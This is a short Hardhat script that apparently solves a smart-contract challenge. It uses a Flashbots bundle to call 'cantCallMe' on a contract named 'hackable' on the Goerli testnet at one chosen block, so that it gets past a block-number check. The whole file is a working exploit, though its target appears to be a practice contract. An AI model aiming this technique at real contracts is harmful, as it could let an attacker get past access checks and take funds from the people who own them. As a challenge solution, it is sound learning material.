const hre = require("hardhat");
const { ethers } = hre;
const {
  FlashbotsBundleProvider,
} = require("@flashbots/ethers-provider-bundle");

const address = '0x445D0FA7FA12A85b30525568DFD09C3002F2ADe5';

// we need to execute the transaction at a specific block number to
// bypass the condition in the contract. we can use flashbots for this
async function main() {
  const { provider } = ethers;

  const signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const flashbotsProvider = await FlashbotsBundleProvider.create(
    provider,
    signer,
    "https://relay-goerli.flashbots.net",
    "goerli",
  );

  const network = await provider.getNetwork();
  const gasPrice = await provider.getGasPrice();
  const gasLimit = 300_000;

  const hackable = await ethers.getContractFactory("hackable");
  const instance = hackable.attach(address);

  const tx = await instance.populateTransaction.cantCallMe();
  console.log(tx);

  const signedTransactions = await flashbotsProvider.signBundle([
    {
      signer,
      transaction: {
        ...tx,
        gasLimit,
        gasPrice,
        chainId: network.chainId,
        value: 0,
      },
    },
  ]);

  const targetBlock = 7362945;

  const simulation = await flashbotsProvider.simulate(
    signedTransactions,
    targetBlock,
  );
  console.log(simulation);

  const bundle = await flashbotsProvider.sendRawBundle(
    signedTransactions,
    targetBlock,
  );
  console.log(bundle);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
